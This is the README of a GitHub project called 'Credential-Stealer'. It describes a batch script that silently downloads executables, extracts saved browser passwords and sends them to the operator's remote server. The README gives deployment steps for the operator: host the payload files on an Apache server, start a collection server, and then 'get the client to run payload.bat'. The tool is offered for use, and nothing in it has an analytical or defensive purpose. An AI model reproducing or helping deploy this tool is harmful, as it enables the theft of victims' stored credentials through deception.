# Credential-Stealer
Simple batch script that silently downloads executable files then extracts saved browser passwords and sends them to a remote server

# Installation

`git clone https://github.com/LTWeaver/Credential-Stealer`

# Usage
Replace <server_ip> and <server-port> in server.py and payload.bat with your servers public IP address and port
Install Apache2 onto a linux server using `sudo apt-get install apache2`
`mv start.bat /var/www/html/start.bat && mv transfer.bat /var/www/html/transfer.bat && mv main.exe /var/www/html/main.exe`
`cd /var/www/html`
`sudo python3 server.py`

Now just get the client to run payload.bat!
